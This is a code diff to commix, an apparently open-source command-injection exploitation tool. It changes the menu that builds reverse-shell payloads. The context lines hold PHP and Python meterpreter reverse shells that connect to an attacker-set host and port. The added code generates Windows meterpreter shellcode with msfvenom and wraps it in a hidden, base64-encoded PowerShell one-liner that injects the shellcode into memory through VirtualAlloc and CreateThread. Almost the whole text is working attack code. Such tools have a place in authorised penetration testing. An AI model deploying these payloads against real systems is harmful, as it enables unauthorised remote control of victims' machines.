@@ -167,6 +167,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
 
     # PHP-reverse-shell (meterpreter)
     elif other_shell == '5':
+
       other_shell ="""/*<?php /**/ error_reporting(0); 
 $ip = '""" + settings.LHOST  + """'; $port = """ + settings.LPORT  + """;
 if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); 
@@ -210,6 +211,7 @@ case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgs
 
     # Python-reverse-shell (meterpreter)
     elif other_shell == '6':
+
       other_shell = """import socket,struct
 s=socket.socket(2,1)
 s.connect(('""" + settings.LHOST + """',""" + settings.LPORT + """))
@@ -254,36 +256,60 @@ exec(d,{'s':s})"""
         while True:
           windows_reverse_shell = raw_input("""
   ---[ """ + Style.BRIGHT + Fore.BLUE + """Powershell injection attacks""" + Style.RESET_ALL + """ ]---
-  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.
+  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use shellcode injection with native x86 shellcode.
+  Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.
 
 commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
-          
+
+          if not os.path.exists(settings.METASPLOIT_PATH):
+            error_msg = "You need to have Metasploit installed. Please ensure Metasploit is installed in the right path."
+            print settings.print_error_msg(error_msg)
+            break
+            
           payload = "windows/meterpreter/reverse_tcp"
+          output = "powershell_attack.txt"
+
           # TrustedSec's Magic Unicorn (3rd Party)
           if windows_reverse_shell == '1':
-            if os.path.exists(settings.METASPLOIT_PATH):
-              unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
-              os.chdir(unicorn_path)
-              # define standard metasploit payload
-              info_msg = "Please wait, while generating the payload shellcode... "
-              sys.stdout.write("\n" + settings.print_info_msg(info_msg))
-              sys.stdout.flush()
-              try:
-                subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
-                # Remove the "unicorn.rc" file.
-                os.remove("unicorn.rc")
-                with open("powershell_attack.txt", 'r') as content_file:
-                  other_shell = content_file.read().replace('\n', '')
-                print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
-                # Remove the "powershell_attack.txt" file.
-                os.remove("powershell_attack.txt")
-              except:
-                print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
-              break
-            else:
-              error_msg = "You need to have Metasploit installed. Please ensure Metasploit is installed in the right path."
-              print settings.print_error_msg(error_msg)
-              break
+            # define standard metasploit payload
+            info_msg = "Please wait, while generating the payload shellcode... "
+            sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+            sys.stdout.flush()
+            try:
+              proc = subprocess.Popen("msfvenom -p " + str(payload) + " LHOST=" + str(settings.LHOST) + " LPORT=" + str(settings.LPORT) + " -f c -o " + output + ">/dev/null 2>&1", shell=True).wait()
+              with open(output, 'r') as content_file:
+                repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', '\\x': ',0x', 'unsignedcharbuf[]=': ''}
+                shellcode = reduce(lambda a, kv: a.replace(*kv), iter(repls.items()), content_file.read()).rstrip()[1:]
+              # One line shellcode injection with native x86 shellcode
+              # Greetz to Dave Kennedy (@HackingDave)
+              powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))
+              other_shell = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  
+              print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+              # Remove the "powershell_attack.txt" file.
+              os.remove(output)
+            except:
+              print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
+            break
+
+          if windows_reverse_shell == '2':
+            unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
+            os.chdir(unicorn_path)
+            # define standard metasploit payload
+            info_msg = "Please wait, while generating the payload shellcode... "
+            sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+            sys.stdout.flush()
+            try:
+              subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
+              # Remove the "unicorn.rc" file.
+              os.remove("unicorn.rc")
+              with open(output, 'r') as content_file:
+                other_shell = content_file.read().replace('\n', '')
+              print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+              # Remove the "powershell_attack.txt" file.
+              os.remove(output)
+            except:
+              print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
+            break
       break
     elif other_shell.lower() == "reverse_tcp":
       warn_msg = "You are already into the 'reverse_tcp' mode."
